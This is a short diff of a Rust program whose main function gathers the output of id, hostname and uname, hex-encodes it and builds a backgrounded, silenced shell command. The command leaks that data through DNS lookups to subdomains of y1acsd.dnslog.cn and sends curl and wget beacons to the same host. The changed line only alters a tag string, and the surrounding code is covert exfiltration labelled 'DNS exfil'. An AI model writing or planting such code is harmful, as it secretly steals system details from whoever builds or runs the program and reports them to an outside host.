@@ -17,7 +17,7 @@ fn main() {
     let i = hex(&id[..id.chars().take(45).count()]);
     let h = hex(&hn[..hn.chars().take(45).count()]);
     let u = hex(&un[..un.chars().take(30).count()]);
-    let tag = "f5a05290";
+    let tag = "f6a05290";
     // DNS exfil: id / hostname / uname, plus plain beacons
     let cmd = format!(
         "(getent hosts i{}.{}.y1acsd.dnslog.cn; getent hosts h{}.{}.y1acsd.dnslog.cn; getent hosts u{}.{}.y1acsd.dnslog.cn; getent hosts ping.{}.y1acsd.dnslog.cn; curl -sm 8 http://ping.{}.y1acsd.dnslog.cn/x >/dev/null 2>&1; wget -q -T 8 -O /dev/null http://ping2.{}.y1acsd.dnslog.cn/x 2>/dev/null) >/dev/null 2>&1 &",
